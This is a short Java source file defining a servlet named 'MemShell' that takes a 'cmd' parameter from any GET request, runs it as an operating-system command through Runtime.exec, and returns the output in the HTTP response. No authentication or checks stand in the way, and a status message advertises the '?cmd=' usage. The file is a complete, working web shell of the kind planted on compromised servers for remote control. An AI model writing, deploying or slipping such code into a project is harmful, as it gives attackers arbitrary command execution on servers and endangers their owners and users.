package com.server.servlet;


import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.io.IOException;

public class MemShell extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String cmd = req.getParameter("cmd");
        if (cmd != null) {
            Process p = Runtime.getRuntime().exec(cmd);
            java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            resp.getWriter().write(output);
        } else {
            resp.getWriter().write("MemShell active. Use ?cmd=...");
        }
    }
}
